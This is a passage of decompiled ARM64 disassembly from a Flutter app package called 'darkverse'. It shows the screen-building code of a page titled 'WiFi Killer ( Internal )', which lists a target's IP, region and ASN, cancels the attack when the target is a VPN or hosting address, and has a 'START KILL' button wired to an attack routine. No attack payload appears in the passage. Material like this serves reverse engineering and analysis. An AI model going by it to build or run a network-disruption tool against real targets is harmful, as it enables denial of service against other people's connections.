    //     0x82c298: stur            w0, [x1, #0x1b]
    //     0x82c29c: ldurb           w16, [x1, #-1]
    //     0x82c2a0: ldurb           w17, [x0, #-1]
    //     0x82c2a4: and             x16, x17, x16, lsr #2
    //     0x82c2a8: tst             x16, HEAP, lsr #32
    //     0x82c2ac: b.eq            #0x82c2b4
    //     0x82c2b0: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x82c2b4: ldur            x1, [fp, #-0x18]
    // 0x82c2b8: LoadField: r2 = r1->field_f
    //     0x82c2b8: ldur            w2, [x1, #0xf]
    // 0x82c2bc: DecompressPointer r2
    //     0x82c2bc: add             x2, x2, HEAP, lsl #32
    // 0x82c2c0: LoadField: r3 = r1->field_1b
    //     0x82c2c0: ldur            w3, [x1, #0x1b]
    // 0x82c2c4: DecompressPointer r3
    //     0x82c2c4: add             x3, x3, HEAP, lsl #32
    // 0x82c2c8: StoreField: r2->field_1f = r3
    //     0x82c2c8: stur            w3, [x2, #0x1f]
    // 0x82c2cc: r1 = false
    //     0x82c2cc: add             x1, NULL, #0x30  ; false
    // 0x82c2d0: StoreField: r2->field_23 = r1
    //     0x82c2d0: stur            w1, [x2, #0x23]
    // 0x82c2d4: r0 = Null
    //     0x82c2d4: mov             x0, NULL
    // 0x82c2d8: LeaveFrame
    //     0x82c2d8: mov             SP, fp
    //     0x82c2dc: ldp             fp, lr, [SP], #0x10
    // 0x82c2e0: ret
    //     0x82c2e0: ret             
    // 0x82c2e4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x82c2e4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x82c2e8: b               #0x82c0dc
  }
  _ build(/* No info */) {
    // ** addr: 0x94bc60, size: 0x70c
    // 0x94bc60: EnterFrame
    //     0x94bc60: stp             fp, lr, [SP, #-0x10]!
    //     0x94bc64: mov             fp, SP
    // 0x94bc68: AllocStack(0x70)
    //     0x94bc68: sub             SP, SP, #0x70
    // 0x94bc6c: SetupParameters(_WifiInternalPageState this /* r1 => r1, fp-0x10 */)
    //     0x94bc6c: stur            x1, [fp, #-0x10]
    // 0x94bc70: CheckStackOverflow
    //     0x94bc70: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94bc74: cmp             SP, x16
    //     0x94bc78: b.ls            #0x94c364
    // 0x94bc7c: LoadField: r0 = r1->field_2b
    //     0x94bc7c: ldur            w0, [x1, #0x2b]
    // 0x94bc80: DecompressPointer r0
    //     0x94bc80: add             x0, x0, HEAP, lsl #32
    // 0x94bc84: stur            x0, [fp, #-8]
    // 0x94bc88: r0 = TextStyle()
    //     0x94bc88: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94bc8c: mov             x1, x0
    // 0x94bc90: r0 = true
    //     0x94bc90: add             x0, NULL, #0x20  ; true
    // 0x94bc94: stur            x1, [fp, #-0x18]
    // 0x94bc98: StoreField: r1->field_7 = r0
    //     0x94bc98: stur            w0, [x1, #7]
    // 0x94bc9c: ldur            x2, [fp, #-8]
    // 0x94bca0: StoreField: r1->field_b = r2
    //     0x94bca0: stur            w2, [x1, #0xb]
    // 0x94bca4: r3 = "Orbitron"
    //     0x94bca4: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94bca8: ldr             x3, [x3, #0xf20]
    // 0x94bcac: StoreField: r1->field_13 = r3
    //     0x94bcac: stur            w3, [x1, #0x13]
    // 0x94bcb0: r0 = Text()
    //     0x94bcb0: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94bcb4: mov             x1, x0
    // 0x94bcb8: r0 = "📡 WiFi Killer ( Internal )"
    //     0x94bcb8: add             x0, PP, #0x37, lsl #12  ; [pp+0x37640] "📡 WiFi Killer ( Internal )"
    //     0x94bcbc: ldr             x0, [x0, #0x640]
    // 0x94bcc0: stur            x1, [fp, #-0x20]
    // 0x94bcc4: StoreField: r1->field_b = r0
    //     0x94bcc4: stur            w0, [x1, #0xb]
    // 0x94bcc8: ldur            x0, [fp, #-0x18]
    // 0x94bccc: StoreField: r1->field_13 = r0
    //     0x94bccc: stur            w0, [x1, #0x13]
    // 0x94bcd0: r0 = IconThemeData()
    //     0x94bcd0: bl              #0x4dce2c  ; AllocateIconThemeDataStub -> IconThemeData (size=0x2c)
    // 0x94bcd4: mov             x1, x0
    // 0x94bcd8: ldur            x0, [fp, #-8]
    // 0x94bcdc: stur            x1, [fp, #-0x18]
    // 0x94bce0: StoreField: r1->field_1b = r0
    //     0x94bce0: stur            w0, [x1, #0x1b]
    // 0x94bce4: r0 = AppBar()
    //     0x94bce4: bl              #0x5fadf4  ; AllocateAppBarStub -> AppBar (size=0x98)
    // 0x94bce8: stur            x0, [fp, #-0x28]
    // 0x94bcec: ldur            x16, [fp, #-0x20]
    // 0x94bcf0: r30 = Instance_Color
    //     0x94bcf0: add             lr, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94bcf4: ldr             lr, [lr, #0xdc0]
    // 0x94bcf8: stp             lr, x16, [SP, #0x10]
    // 0x94bcfc: r16 = 6.000000
    //     0x94bcfc: add             x16, PP, #0xd, lsl #12  ; [pp+0xdab8] 6
    //     0x94bd00: ldr             x16, [x16, #0xab8]
    // 0x94bd04: ldur            lr, [fp, #-0x18]
    // 0x94bd08: stp             lr, x16, [SP]
    // 0x94bd0c: mov             x1, x0
    // 0x94bd10: r4 = const [0, 0x5, 0x4, 0x1, backgroundColor, 0x2, elevation, 0x3, iconTheme, 0x4, title, 0x1, null]
    //     0x94bd10: add             x4, PP, #0x37, lsl #12  ; [pp+0x37648] List(13) [0, 0x5, 0x4, 0x1, "backgroundColor", 0x2, "elevation", 0x3, "iconTheme", 0x4, "title", 0x1, Null]
    //     0x94bd14: ldr             x4, [x4, #0x648]
    // 0x94bd18: r0 = AppBar()
    //     0x94bd18: bl              #0x5fa308  ; [package:flutter/src/material/app_bar.dart] AppBar::AppBar
    // 0x94bd1c: ldur            x1, [fp, #-0x10]
    // 0x94bd20: LoadField: r0 = r1->field_23
    //     0x94bd20: ldur            w0, [x1, #0x23]
    // 0x94bd24: DecompressPointer r0
    //     0x94bd24: add             x0, x0, HEAP, lsl #32
    // 0x94bd28: tbnz            w0, #4, #0x94bd38
    // 0x94bd2c: r1 = Instance_Center
    //     0x94bd2c: add             x1, PP, #0x37, lsl #12  ; [pp+0x37650] Obj!Center@a3b761
    //     0x94bd30: ldr             x1, [x1, #0x650]
    // 0x94bd34: b               #0x94c2a8
    // 0x94bd38: ldur            x0, [fp, #-8]
    // 0x94bd3c: r0 = TextStyle()
    //     0x94bd3c: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94bd40: mov             x1, x0
    // 0x94bd44: r0 = true
    //     0x94bd44: add             x0, NULL, #0x20  ; true
    // 0x94bd48: stur            x1, [fp, #-0x18]
    // 0x94bd4c: StoreField: r1->field_7 = r0
    //     0x94bd4c: stur            w0, [x1, #7]
    // 0x94bd50: ldur            x2, [fp, #-8]
    // 0x94bd54: StoreField: r1->field_b = r2
    //     0x94bd54: stur            w2, [x1, #0xb]
    // 0x94bd58: r3 = 20.000000
    //     0x94bd58: add             x3, PP, #0xd, lsl #12  ; [pp+0xd9f8] 20
    //     0x94bd5c: ldr             x3, [x3, #0x9f8]
    // 0x94bd60: StoreField: r1->field_1f = r3
    //     0x94bd60: stur            w3, [x1, #0x1f]
    // 0x94bd64: r3 = Instance_FontWeight
    //     0x94bd64: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94bd68: ldr             x3, [x3, #0xf08]
    // 0x94bd6c: StoreField: r1->field_23 = r3
    //     0x94bd6c: stur            w3, [x1, #0x23]
    // 0x94bd70: r3 = "Orbitron"
    //     0x94bd70: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94bd74: ldr             x3, [x3, #0xf20]
    // 0x94bd78: StoreField: r1->field_13 = r3
    //     0x94bd78: stur            w3, [x1, #0x13]
    // 0x94bd7c: r0 = Text()
    //     0x94bd7c: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94bd80: mov             x4, x0
    // 0x94bd84: r0 = "🎯 System Information"
    //     0x94bd84: add             x0, PP, #0x37, lsl #12  ; [pp+0x37658] "🎯 System Information"
    //     0x94bd88: ldr             x0, [x0, #0x658]
    // 0x94bd8c: stur            x4, [fp, #-0x20]
    // 0x94bd90: StoreField: r4->field_b = r0
    //     0x94bd90: stur            w0, [x4, #0xb]
    // 0x94bd94: ldur            x0, [fp, #-0x18]
    // 0x94bd98: StoreField: r4->field_13 = r0
    //     0x94bd98: stur            w0, [x4, #0x13]
    // 0x94bd9c: ldur            x0, [fp, #-0x10]
    // 0x94bda0: LoadField: r3 = r0->field_13
    //     0x94bda0: ldur            w3, [x0, #0x13]
    // 0x94bda4: DecompressPointer r3
    //     0x94bda4: add             x3, x3, HEAP, lsl #32
    // 0x94bda8: mov             x1, x0
    // 0x94bdac: r2 = "IP Address"
    //     0x94bdac: add             x2, PP, #0x37, lsl #12  ; [pp+0x373b0] "IP Address"
    //     0x94bdb0: ldr             x2, [x2, #0x3b0]
    // 0x94bdb4: r5 = Instance_IconData
    //     0x94bdb4: add             x5, PP, #0x37, lsl #12  ; [pp+0x37660] Obj!IconData@a03bc1
    //     0x94bdb8: ldr             x5, [x5, #0x660]
    // 0x94bdbc: r0 = _infoCard()
    //     0x94bdbc: bl              #0x94c36c  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_infoCard
    // 0x94bdc0: mov             x4, x0
    // 0x94bdc4: ldur            x0, [fp, #-0x10]
    // 0x94bdc8: stur            x4, [fp, #-0x18]
    // 0x94bdcc: ArrayLoad: r3 = r0[0]  ; List_4
    //     0x94bdcc: ldur            w3, [x0, #0x17]
    // 0x94bdd0: DecompressPointer r3
    //     0x94bdd0: add             x3, x3, HEAP, lsl #32
    // 0x94bdd4: mov             x1, x0
    // 0x94bdd8: r2 = "Region"
    //     0x94bdd8: add             x2, PP, #0x37, lsl #12  ; [pp+0x37668] "Region"
    //     0x94bddc: ldr             x2, [x2, #0x668]
    // 0x94bde0: r5 = Instance_IconData
    //     0x94bde0: add             x5, PP, #0x37, lsl #12  ; [pp+0x37670] Obj!IconData@a03ba1
    //     0x94bde4: ldr             x5, [x5, #0x670]
    // 0x94bde8: r0 = _infoCard()
    //     0x94bde8: bl              #0x94c36c  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_infoCard
    // 0x94bdec: mov             x4, x0
    // 0x94bdf0: ldur            x0, [fp, #-0x10]
    // 0x94bdf4: stur            x4, [fp, #-0x30]
    // 0x94bdf8: LoadField: r3 = r0->field_1b
    //     0x94bdf8: ldur            w3, [x0, #0x1b]
    // 0x94bdfc: DecompressPointer r3
    //     0x94bdfc: add             x3, x3, HEAP, lsl #32
    // 0x94be00: mov             x1, x0
    // 0x94be04: r2 = "ASN"
    //     0x94be04: add             x2, PP, #0x37, lsl #12  ; [pp+0x37678] "ASN"
    //     0x94be08: ldr             x2, [x2, #0x678]
    // 0x94be0c: r5 = Instance_IconData
    //     0x94be0c: add             x5, PP, #0x37, lsl #12  ; [pp+0x37680] Obj!IconData@a03b81
    //     0x94be10: ldr             x5, [x5, #0x680]
    // 0x94be14: r0 = _infoCard()
    //     0x94be14: bl              #0x94c36c  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_infoCard
    // 0x94be18: r1 = Null
    //     0x94be18: mov             x1, NULL
    // 0x94be1c: r2 = 12
    //     0x94be1c: mov             x2, #0xc
    // 0x94be20: stur            x0, [fp, #-0x38]
    // 0x94be24: r0 = AllocateArray()
    //     0x94be24: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94be28: mov             x2, x0
    // 0x94be2c: ldur            x0, [fp, #-0x20]
    // 0x94be30: stur            x2, [fp, #-0x40]
    // 0x94be34: StoreField: r2->field_f = r0
    //     0x94be34: stur            w0, [x2, #0xf]
    // 0x94be38: r16 = Instance_SizedBox
    //     0x94be38: add             x16, PP, #0xf, lsl #12  ; [pp+0xf990] Obj!SizedBox@a3a881
    //     0x94be3c: ldr             x16, [x16, #0x990]
    // 0x94be40: StoreField: r2->field_13 = r16
    //     0x94be40: stur            w16, [x2, #0x13]
    // 0x94be44: ldur            x0, [fp, #-0x18]
    // 0x94be48: ArrayStore: r2[0] = r0  ; List_4
    //     0x94be48: stur            w0, [x2, #0x17]
    // 0x94be4c: ldur            x0, [fp, #-0x30]
    // 0x94be50: StoreField: r2->field_1b = r0
    //     0x94be50: stur            w0, [x2, #0x1b]
    // 0x94be54: ldur            x0, [fp, #-0x38]
    // 0x94be58: StoreField: r2->field_1f = r0
    //     0x94be58: stur            w0, [x2, #0x1f]
    // 0x94be5c: r16 = Instance_SizedBox
    //     0x94be5c: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x94be60: ldr             x16, [x16, #0x5b0]
    // 0x94be64: StoreField: r2->field_23 = r16
    //     0x94be64: stur            w16, [x2, #0x23]
    // 0x94be68: r1 = <Widget>
    //     0x94be68: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94be6c: r0 = AllocateGrowableArray()
    //     0x94be6c: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94be70: mov             x1, x0
    // 0x94be74: ldur            x0, [fp, #-0x40]
    // 0x94be78: stur            x1, [fp, #-0x18]
    // 0x94be7c: StoreField: r1->field_f = r0
    //     0x94be7c: stur            w0, [x1, #0xf]
    // 0x94be80: r0 = 12
    //     0x94be80: mov             x0, #0xc
    // 0x94be84: StoreField: r1->field_b = r0
    //     0x94be84: stur            w0, [x1, #0xb]
    // 0x94be88: ldur            x2, [fp, #-0x10]
    // 0x94be8c: LoadField: r0 = r2->field_1f
    //     0x94be8c: ldur            w0, [x2, #0x1f]
    // 0x94be90: DecompressPointer r0
    //     0x94be90: add             x0, x0, HEAP, lsl #32
    // 0x94be94: tbnz            w0, #4, #0x94c054
    // 0x94be98: ldur            x0, [fp, #-8]
    // 0x94be9c: r0 = Color()
    //     0x94be9c: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x94bea0: mov             x1, x0
    // 0x94bea4: r0 = Instance_ColorSpace
    //     0x94bea4: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x94bea8: stur            x1, [fp, #-0x20]
    // 0x94beac: StoreField: r1->field_27 = r0
    //     0x94beac: stur            w0, [x1, #0x27]
    // 0x94beb0: d0 = 1.000000
    //     0x94beb0: fmov            d0, #1.00000000
    // 0x94beb4: StoreField: r1->field_7 = d0
    //     0x94beb4: stur            d0, [x1, #7]
    // 0x94beb8: d0 = 0.141176
    //     0x94beb8: add             x17, PP, #0x37, lsl #12  ; [pp+0x37688] IMM: double(0.1411764705882353) from 0x3fc2121212121212
    //     0x94bebc: ldr             d0, [x17, #0x688]
    // 0x94bec0: StoreField: r1->field_f = d0
    //     0x94bec0: stur            d0, [x1, #0xf]
    // 0x94bec4: d0 = 0.070588
    //     0x94bec4: add             x17, PP, #0xc, lsl #12  ; [pp+0xceb0] IMM: double(0.07058823529411765) from 0x3fb2121212121212
    //     0x94bec8: ldr             d0, [x17, #0xeb0]
    // 0x94becc: ArrayStore: r1[0] = d0  ; List_8
    //     0x94becc: stur            d0, [x1, #0x17]
    // 0x94bed0: StoreField: r1->field_1f = d0
    //     0x94bed0: stur            d0, [x1, #0x1f]
    // 0x94bed4: r0 = Radius()
    //     0x94bed4: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94bed8: d0 = 12.000000
    //     0x94bed8: fmov            d0, #12.00000000
    // 0x94bedc: stur            x0, [fp, #-0x30]
    // 0x94bee0: StoreField: r0->field_7 = d0
    //     0x94bee0: stur            d0, [x0, #7]
    // 0x94bee4: StoreField: r0->field_f = d0
    //     0x94bee4: stur            d0, [x0, #0xf]
    // 0x94bee8: r0 = BorderRadius()
    //     0x94bee8: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94beec: mov             x2, x0
    // 0x94bef0: ldur            x0, [fp, #-0x30]
    // 0x94bef4: stur            x2, [fp, #-0x38]
    // 0x94bef8: StoreField: r2->field_7 = r0
    //     0x94bef8: stur            w0, [x2, #7]
    // 0x94befc: StoreField: r2->field_b = r0
    //     0x94befc: stur            w0, [x2, #0xb]
    // 0x94bf00: StoreField: r2->field_f = r0
    //     0x94bf00: stur            w0, [x2, #0xf]
    // 0x94bf04: StoreField: r2->field_13 = r0
    //     0x94bf04: stur            w0, [x2, #0x13]
    // 0x94bf08: r16 = Instance_Color
    //     0x94bf08: add             x16, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94bf0c: ldr             x16, [x16, #0xd28]
    // 0x94bf10: str             x16, [SP]
    // 0x94bf14: r1 = Null
    //     0x94bf14: mov             x1, NULL
    // 0x94bf18: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x94bf18: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x94bf1c: ldr             x4, [x4, #0xc68]
    // 0x94bf20: r0 = Border.all()
    //     0x94bf20: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x94bf24: stur            x0, [fp, #-0x30]
    // 0x94bf28: r0 = BoxDecoration()
    //     0x94bf28: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x94bf2c: mov             x1, x0
    // 0x94bf30: ldur            x0, [fp, #-0x20]
    // 0x94bf34: stur            x1, [fp, #-0x40]
    // 0x94bf38: StoreField: r1->field_7 = r0
    //     0x94bf38: stur            w0, [x1, #7]
    // 0x94bf3c: ldur            x0, [fp, #-0x30]
    // 0x94bf40: StoreField: r1->field_f = r0
    //     0x94bf40: stur            w0, [x1, #0xf]
    // 0x94bf44: ldur            x0, [fp, #-0x38]
    // 0x94bf48: StoreField: r1->field_13 = r0
    //     0x94bf48: stur            w0, [x1, #0x13]
    // 0x94bf4c: r0 = Instance_BoxShape
    //     0x94bf4c: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x94bf50: ldr             x0, [x0, #0xd78]
    // 0x94bf54: StoreField: r1->field_23 = r0
    //     0x94bf54: stur            w0, [x1, #0x23]
    // 0x94bf58: r0 = TextStyle()
    //     0x94bf58: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94bf5c: mov             x1, x0
    // 0x94bf60: r0 = true
    //     0x94bf60: add             x0, NULL, #0x20  ; true
    // 0x94bf64: stur            x1, [fp, #-0x20]
    // 0x94bf68: StoreField: r1->field_7 = r0
    //     0x94bf68: stur            w0, [x1, #7]
    // 0x94bf6c: ldur            x2, [fp, #-8]
    // 0x94bf70: StoreField: r1->field_b = r2
    //     0x94bf70: stur            w2, [x1, #0xb]
    // 0x94bf74: r3 = "ShareTechMono"
    //     0x94bf74: add             x3, PP, #0x18, lsl #12  ; [pp+0x187c8] "ShareTechMono"
    //     0x94bf78: ldr             x3, [x3, #0x7c8]
    // 0x94bf7c: StoreField: r1->field_13 = r3
    //     0x94bf7c: stur            w3, [x1, #0x13]
    // 0x94bf80: r0 = Text()
    //     0x94bf80: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94bf84: mov             x1, x0
    // 0x94bf88: r0 = "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan."
    //     0x94bf88: add             x0, PP, #0x37, lsl #12  ; [pp+0x37690] "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan."
    //     0x94bf8c: ldr             x0, [x0, #0x690]
    // 0x94bf90: stur            x1, [fp, #-0x30]
    // 0x94bf94: StoreField: r1->field_b = r0
    //     0x94bf94: stur            w0, [x1, #0xb]
    // 0x94bf98: ldur            x0, [fp, #-0x20]
    // 0x94bf9c: StoreField: r1->field_13 = r0
    //     0x94bf9c: stur            w0, [x1, #0x13]
    // 0x94bfa0: r0 = Instance_TextAlign
    //     0x94bfa0: ldr             x0, [PP, #0x4950]  ; [pp+0x4950] Obj!TextAlign@a43341
    // 0x94bfa4: StoreField: r1->field_1b = r0
    //     0x94bfa4: stur            w0, [x1, #0x1b]
    // 0x94bfa8: r0 = Container()
    //     0x94bfa8: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x94bfac: stur            x0, [fp, #-0x20]
    // 0x94bfb0: r16 = Instance_EdgeInsets
    //     0x94bfb0: add             x16, PP, #0x11, lsl #12  ; [pp+0x11e18] Obj!EdgeInsets@a06141
    //     0x94bfb4: ldr             x16, [x16, #0xe18]
    // 0x94bfb8: ldur            lr, [fp, #-0x40]
    // 0x94bfbc: stp             lr, x16, [SP, #8]
    // 0x94bfc0: ldur            x16, [fp, #-0x30]
    // 0x94bfc4: str             x16, [SP]
    // 0x94bfc8: mov             x1, x0
    // 0x94bfcc: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x94bfcc: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x94bfd0: ldr             x4, [x4, #0xe58]
    // 0x94bfd4: r0 = Container()
    //     0x94bfd4: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x94bfd8: ldur            x0, [fp, #-0x18]
    // 0x94bfdc: LoadField: r1 = r0->field_b
    //     0x94bfdc: ldur            w1, [x0, #0xb]
    // 0x94bfe0: LoadField: r2 = r0->field_f
    //     0x94bfe0: ldur            w2, [x0, #0xf]
    // 0x94bfe4: DecompressPointer r2
    //     0x94bfe4: add             x2, x2, HEAP, lsl #32
    // 0x94bfe8: LoadField: r3 = r2->field_b
    //     0x94bfe8: ldur            w3, [x2, #0xb]
    // 0x94bfec: r2 = LoadInt32Instr(r1)
    //     0x94bfec: sbfx            x2, x1, #1, #0x1f
    // 0x94bff0: stur            x2, [fp, #-0x48]
    // 0x94bff4: r1 = LoadInt32Instr(r3)
    //     0x94bff4: sbfx            x1, x3, #1, #0x1f
    // 0x94bff8: cmp             x2, x1
    // 0x94bffc: b.ne            #0x94c008
    // 0x94c000: mov             x1, x0
    // 0x94c004: r0 = _growToNextCapacity()
    //     0x94c004: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x94c008: ldur            x3, [fp, #-0x18]
    // 0x94c00c: ldur            x2, [fp, #-0x48]
    // 0x94c010: add             x0, x2, #1
    // 0x94c014: lsl             x1, x0, #1
    // 0x94c018: StoreField: r3->field_b = r1
    //     0x94c018: stur            w1, [x3, #0xb]
    // 0x94c01c: LoadField: r1 = r3->field_f
    //     0x94c01c: ldur            w1, [x3, #0xf]
    // 0x94c020: DecompressPointer r1
    //     0x94c020: add             x1, x1, HEAP, lsl #32
    // 0x94c024: ldur            x0, [fp, #-0x20]
    // 0x94c028: ArrayStore: r1[r2] = r0  ; List_4
    //     0x94c028: add             x25, x1, x2, lsl #2
    //     0x94c02c: add             x25, x25, #0xf
    //     0x94c030: str             w0, [x25]
    //     0x94c034: tbz             w0, #0, #0x94c050
    //     0x94c038: ldurb           w16, [x1, #-1]
    //     0x94c03c: ldurb           w17, [x0, #-1]
    //     0x94c040: and             x16, x17, x16, lsr #2
    //     0x94c044: tst             x16, HEAP, lsr #32
    //     0x94c048: b.eq            #0x94c050
    //     0x94c04c: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x94c050: b               #0x94c058
    // 0x94c054: mov             x3, x1
    // 0x94c058: ldur            x2, [fp, #-0x10]
    // 0x94c05c: LoadField: r0 = r2->field_1f
    //     0x94c05c: ldur            w0, [x2, #0x1f]
    // 0x94c060: DecompressPointer r0
    //     0x94c060: add             x0, x0, HEAP, lsl #32
    // 0x94c064: tbz             w0, #4, #0x94c258
    // 0x94c068: LoadField: r0 = r2->field_27
    //     0x94c068: ldur            w0, [x2, #0x27]
    // 0x94c06c: DecompressPointer r0
    //     0x94c06c: add             x0, x0, HEAP, lsl #32
    // 0x94c070: stur            x0, [fp, #-0x20]
    // 0x94c074: tbnz            w0, #4, #0x94c080
    // 0x94c078: r5 = Null
    //     0x94c078: mov             x5, NULL
    // 0x94c07c: b               #0x94c094
    // 0x94c080: r1 = Function '_attackTarget@961309516':.
    //     0x94c080: add             x1, PP, #0x37, lsl #12  ; [pp+0x37698] AnonymousClosure: (0x94c5a8), in [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_attackTarget (0x94c5e0)
    //     0x94c084: ldr             x1, [x1, #0x698]
    // 0x94c088: r0 = AllocateClosure()
    //     0x94c088: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94c08c: mov             x5, x0
    // 0x94c090: ldur            x0, [fp, #-0x20]
    // 0x94c094: ldur            x1, [fp, #-8]
    // 0x94c098: stur            x5, [fp, #-0x10]
    // 0x94c09c: r0 = Icon()
    //     0x94c09c: bl              #0x6b0738  ; AllocateIconStub -> Icon (size=0x40)
    // 0x94c0a0: mov             x1, x0
    // 0x94c0a4: r0 = Instance_IconData
    //     0x94c0a4: add             x0, PP, #0x28, lsl #12  ; [pp+0x28c48] Obj!IconData@a01641
    //     0x94c0a8: ldr             x0, [x0, #0xc48]
    // 0x94c0ac: stur            x1, [fp, #-0x30]
    // 0x94c0b0: StoreField: r1->field_b = r0
    //     0x94c0b0: stur            w0, [x1, #0xb]
    // 0x94c0b4: ldur            x0, [fp, #-8]
    // 0x94c0b8: StoreField: r1->field_23 = r0
    //     0x94c0b8: stur            w0, [x1, #0x23]
    // 0x94c0bc: ldur            x2, [fp, #-0x20]
    // 0x94c0c0: tbnz            w2, #4, #0x94c0d0
    // 0x94c0c4: r3 = "ATTACKING..."
    //     0x94c0c4: add             x3, PP, #0x37, lsl #12  ; [pp+0x376a0] "ATTACKING..."
    //     0x94c0c8: ldr             x3, [x3, #0x6a0]
    // 0x94c0cc: b               #0x94c0d8
    // 0x94c0d0: r3 = "START KILL"
    //     0x94c0d0: add             x3, PP, #0x37, lsl #12  ; [pp+0x376a8] "START KILL"
    //     0x94c0d4: ldr             x3, [x3, #0x6a8]
    // 0x94c0d8: ldur            x2, [fp, #-0x18]
    // 0x94c0dc: stur            x3, [fp, #-0x20]
    // 0x94c0e0: r0 = Text()
    //     0x94c0e0: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94c0e4: mov             x1, x0
    // 0x94c0e8: ldur            x0, [fp, #-0x20]
    // 0x94c0ec: stur            x1, [fp, #-0x38]
    // 0x94c0f0: StoreField: r1->field_b = r0
    //     0x94c0f0: stur            w0, [x1, #0xb]
    // 0x94c0f4: r0 = Instance_TextStyle
    //     0x94c0f4: add             x0, PP, #0x37, lsl #12  ; [pp+0x376b0] Obj!TextStyle@a27731
    //     0x94c0f8: ldr             x0, [x0, #0x6b0]
    // 0x94c0fc: StoreField: r1->field_13 = r0
    //     0x94c0fc: stur            w0, [x1, #0x13]
    // 0x94c100: r0 = Radius()
    //     0x94c100: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94c104: d0 = 30.000000
    //     0x94c104: fmov            d0, #30.00000000
    // 0x94c108: stur            x0, [fp, #-0x20]
    // 0x94c10c: StoreField: r0->field_7 = d0
    //     0x94c10c: stur            d0, [x0, #7]
    // 0x94c110: StoreField: r0->field_f = d0
    //     0x94c110: stur            d0, [x0, #0xf]
    // 0x94c114: r0 = BorderRadius()
    //     0x94c114: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94c118: mov             x1, x0
    // 0x94c11c: ldur            x0, [fp, #-0x20]
    // 0x94c120: stur            x1, [fp, #-0x40]
    // 0x94c124: StoreField: r1->field_7 = r0
    //     0x94c124: stur            w0, [x1, #7]
    // 0x94c128: StoreField: r1->field_b = r0
    //     0x94c128: stur            w0, [x1, #0xb]
    // 0x94c12c: StoreField: r1->field_f = r0
    //     0x94c12c: stur            w0, [x1, #0xf]
    // 0x94c130: StoreField: r1->field_13 = r0
    //     0x94c130: stur            w0, [x1, #0x13]
    // 0x94c134: r0 = RoundedRectangleBorder()
    //     0x94c134: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x94c138: mov             x2, x0
    // 0x94c13c: ldur            x0, [fp, #-0x40]
    // 0x94c140: stur            x2, [fp, #-0x20]
    // 0x94c144: StoreField: r2->field_b = r0
    //     0x94c144: stur            w0, [x2, #0xb]
    // 0x94c148: r0 = Instance_BorderSide
    //     0x94c148: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd70] Obj!BorderSide@a28af1
    //     0x94c14c: ldr             x0, [x0, #0xd70]
    // 0x94c150: StoreField: r2->field_7 = r0
    //     0x94c150: stur            w0, [x2, #7]
    // 0x94c154: r1 = Instance_Color
    //     0x94c154: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c158: ldr             x1, [x1, #0xd28]
    // 0x94c15c: d0 = 0.500000
    //     0x94c15c: fmov            d0, #0.50000000
    // 0x94c160: r0 = withOpacity()
    //     0x94c160: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94c164: ldur            x16, [fp, #-8]
    // 0x94c168: r30 = Instance_EdgeInsets
